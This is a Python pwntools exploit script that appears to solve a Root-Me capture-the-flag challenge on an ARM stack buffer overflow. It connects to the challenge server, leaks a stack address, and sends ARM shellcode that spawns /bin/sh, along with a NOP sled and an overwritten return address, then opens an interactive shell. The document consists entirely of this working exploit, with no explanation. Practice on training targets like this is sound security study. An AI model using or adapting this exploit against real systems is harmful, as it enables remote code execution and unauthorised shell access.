#!/usr/bin/env python
from pwn import *

# Start remote process
p = remote('challenge04.root-me.org', 61045)

# Leak buffer address on stack
p.sendline('A')
p.recvuntil('dump:')
ret_addr = p.recvuntil(':')
ret_addr = int(ret_addr[:-1], 16)
log.info("Leaked address is: 0x{:08x}".format(ret_addr))

# Dump again
p.sendline('y')

# Craft payload
sc = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78"
nop = asm(shellcraft.arm.nop(), arch='arm')
payload =  sc + nop*(136 / 4) + p32(ret_addr)

# Send payload
p.sendline(payload)

# Send not to dump again - this is trigger to return
p.sendline('n')

# Enjoy the shell
p.interactive()

# Close remote process
p.close()

# ELF ARM - Stack buffer overflow - basic
